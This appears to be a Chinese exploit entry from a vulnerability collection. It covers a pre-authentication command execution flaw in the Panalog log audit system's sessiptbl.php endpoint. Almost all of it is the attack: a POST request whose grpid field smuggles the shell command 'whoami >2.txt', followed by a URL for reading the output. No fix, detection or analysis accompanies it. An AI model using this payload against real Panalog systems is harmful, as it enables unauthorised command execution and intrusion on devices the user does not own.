# Panalog日志审计系统sessiptbl.php前台存在命令执行漏洞

Panalog ｜ 命令执行 ｜ —
- **请求**：`POST /sessiptbl.php HTTP/1.1`

**Payload**
```
action=serverdelay&grpid=whoami >2.txt
http://ip/2.txt
```